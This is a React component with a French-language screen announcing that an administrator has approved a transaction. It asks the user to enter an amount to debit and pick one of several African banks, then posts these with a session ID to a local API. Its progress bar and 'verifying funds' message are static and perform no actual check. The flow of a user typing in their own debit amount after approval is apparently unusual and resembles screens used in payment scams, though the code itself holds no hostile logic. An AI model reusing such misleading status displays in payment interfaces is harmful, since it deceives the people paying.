// src/components/ApprovalInterface.jsx
import React, { useState } from 'react';
import './ApprovalInterface.css';

const ApprovalInterface = ({ sessionId, onComplete, onCancel }) => {
  const [loading, setLoading] = useState(false);
  const [amount, setAmount] = useState('');
  const [selectedBank, setSelectedBank] = useState('');

  const handleConfirmApproval = async () => {
    setLoading(true);
    try {
      // Envoyer confirmation de l'approbation
      const response = await fetch('/api/approval-confirmed', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, amount, selectedBank })
      });
      
      if (response.ok) {
        onComplete?.();
      }
    } catch (error) {
      console.error('Error confirming approval:', error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="approval-overlay">
      <div className="approval-container">
        <div className="approval-header">
          <div className="success-icon">✅</div>
          <h2>Transaction Approuvée!</h2>
          <p>La transaction a été approuvée par l'administrateur</p>
        </div>
        
        <div className="approval-content">
          <div className="info-card">
            <h3>📋 Détails de la Transaction</h3>
            <div className="info-row">
              <span>Session ID:</span>
              <code>{sessionId}</code>
            </div>
            <div className="info-row">
              <span>Statut:</span>
              <span className="status-approved">Approuvée ✓</span>
            </div>
            <div className="info-row">
              <span>Date:</span>
              <span>{new Date().toLocaleString()}</span>
            </div>
          </div>

          <div className="form-group">
            <label>Montant à débiter:</label>
            <input 
              type="number" 
              placeholder="Entrez le montant"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="amount-input"
            />
          </div>

          <div className="form-group">
            <label>Sélectionnez la banque:</label>
            <select value={selectedBank} onChange={(e) => setSelectedBank(e.target.value)}>
              <option value="">Choisir une banque</option>
              <option value="cba">Commercial Bank of Africa</option>
              <option value="equity">Equity Bank</option>
              <option value="kcb">KCB Bank</option>
              <option value="coop">Cooperative Bank</option>
            </select>
          </div>

          <div className="progress-section">
            <h3>🔄 Traitement en cours...</h3>
            <div className="progress-bar">
              <div className="progress-fill"></div>
            </div>
            <p className="progress-text">Vérification des fonds...</p>
          </div>

          <div className="button-group">
            <button 
              onClick={handleConfirmApproval} 
              disabled={loading || !amount || !selectedBank}
              className="btn-confirm"
            >
              {loading ? 'Traitement...' : 'Confirmer et Continuer'}
            </button>
            <button onClick={onCancel} className="btn-cancel">
              Annuler
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ApprovalInterface;